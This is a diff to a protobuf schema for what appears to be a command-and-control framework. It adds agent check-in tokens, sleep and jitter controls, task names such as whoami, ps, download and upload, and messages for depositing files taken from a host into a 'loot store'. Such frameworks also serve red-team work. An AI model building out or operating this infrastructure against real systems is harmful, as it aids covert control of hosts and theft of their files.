@@ -22,6 +22,18 @@ message AgentCheckIn {
 
   // Agent build version (semver-ish), used by the update service.
   string version = 8;
+
+  // Shared secret; must match teamserver LATTICE_AGENT_TOKEN when set.
+  string agent_token = 9;
+
+  // Capability flags the agent implements (e.g. shell, ps, fs, download, upload).
+  repeated string features = 10;
+
+  // Concrete task/op names the agent accepts (e.g. whoami, ps, ls, download).
+  repeated string ops = 11;
+
+  // Current jitter percent (0-100) applied on top of sleep.
+  uint32 jitter_percent = 12;
 }
 
 // Server -> agent after check-in.
@@ -30,11 +42,15 @@ message AgentCheckInResponse {
   repeated Task tasks = 2;
   // Set when a newer agent build is published for this os/arch.
   UpdateInfo update = 3;
+  // When set (>0), agent should adopt this sleep interval.
+  uint64 sleep_seconds = 4;
+  // When set, agent should adopt this jitter percent (0-100). Absolute; 0 clears jitter.
+  optional uint32 jitter_percent = 5;
 }
 
 message Task {
   string task_id = 1;
-  // Builtin name, e.g. "whoami", "echo".
+  // Builtin name, e.g. "whoami", "echo", "ps", "ls", "download", "upload".
   string name = 2;
   repeated string args = 3;
 }
@@ -104,6 +120,7 @@ message AgentUpdateCheck {
   string os = 2;
   string arch = 3;
   string current_version = 4;
+  string agent_token = 5;
 }
 
 message AgentUpdateCheckResponse {
@@ -117,6 +134,7 @@ message AgentUpdateDownload {
   string os = 2;
   string arch = 3;
   string version = 4; // empty = latest published for platform
+  string agent_token = 5;
 }
 
 message AgentUpdateDownloadResponse {
@@ -143,9 +161,40 @@ message AgentModuleDownload {
   string os = 4;
   string arch = 5;
   string version = 6; // empty = newest
+  string agent_token = 7;
 }
 
 message AgentModuleDownloadResponse {
   ModuleInfo module = 1;
   bytes data = 2;
+}
+
+// Agent -> server: deposit a file into the loot store (upload task result companion).
+message AgentLootUpload {
+  string agent_id = 1;
+  string agent_token = 2;
+  string task_id = 3;
+  string remote_path = 4;
+  string name = 5;
+  bytes data = 6;
+  string content_type = 7;
+}
+
+message AgentLootUploadResponse {
+  bool accepted = 1;
+  string loot_id = 2;
+}
+
+// Agent -> server: fetch bytes for a download task (server may stage via operator upload later).
+message AgentLootDownload {
+  string agent_id = 1;
+  string agent_token = 2;
+  string loot_id = 3;
+}
+
+message AgentLootDownloadResponse {
+  bool found = 1;
+  string name = 2;
+  bytes data = 3;
+  string content_type = 4;
 }
